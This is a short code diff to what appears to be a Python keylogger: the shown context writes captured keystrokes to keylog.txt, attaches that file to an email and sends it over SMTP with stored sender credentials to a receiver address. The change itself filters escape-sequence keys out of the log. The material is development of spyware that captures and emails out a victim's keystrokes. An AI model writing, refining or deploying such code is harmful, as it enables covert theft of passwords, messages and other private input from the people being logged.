@@ -43,6 +43,9 @@ def writeFile(key, action):
 
     if letter.find('Key') == 0:
         letter = ""
+    
+    if letter.find("\\x") == 0:
+        letter = ""
 
     with open("keylog.txt",action) as f:
         f.write(letter)
@@ -59,7 +62,6 @@ def createEmail(attachment_path):
         msg.add_attachment(file_data, maintype="text", subtype="plain", filename="keylog.txt")
 
     return msg.as_string()
-
 
 def sendEmail(msg):
     global SMTP_SERVER, SMTP_PORT, SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL
